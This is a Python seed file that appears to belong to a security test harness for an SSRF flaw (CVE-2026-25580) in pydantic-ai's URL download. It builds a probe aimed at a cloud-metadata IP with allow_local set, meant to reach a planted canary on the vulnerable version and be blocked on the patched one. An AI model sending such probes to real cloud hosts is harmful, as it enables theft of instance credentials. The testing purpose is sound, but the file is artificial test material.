#!/usr/bin/env python3
"""[GIVEN] CVE-2026-25580 seed exploit — pydantic-ai URL-download SSRF to a cloud-metadata IP.

pydantic-ai < 1.56.0 downloaded a message-history FileUrl (ImageUrl/DocumentUrl/...) via
`download_item()` -> `client.get(item.url)` with NO validation, so an attacker-supplied URL could
target the cloud metadata service and exfiltrate IAM credentials. Here the seed points the download
sink at the (simulated) Alibaba metadata endpoint 100.100.100.200 — one of pydantic-ai's
_CLOUD_METADATA_IPS — which echoes the planted ${PCB_FLAG}.

Contract: reaches the canary on V0; BLOCKED on V1 (1.56.0). The CVE-2026-25580 fix (given in
patch.diff) adds `safe_download()` whose `is_cloud_metadata_ip()` matches the literal string
'100.100.100.200' in _CLOUD_METADATA_IPS and rejects it EVEN WITH allow_local=True (metadata is
always blocked). This literal-IP seed is what the system-under-test is given.
"""
from __future__ import annotations

# Literal cloud-metadata IP. V0 has no guard -> fetched. V1's _CLOUD_METADATA_IPS string match
# rejects it even with allow_local=True -> blocked.
TARGET_URL = "http://100.100.100.200/"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-25580-literal-metadata-ip",
        "method": "GET",
        "endpoint": "/fetch",
        "target_url": TARGET_URL,
        "allow_local": True,
    }


if __name__ == "__main__":
    print(candidate()["target_url"])
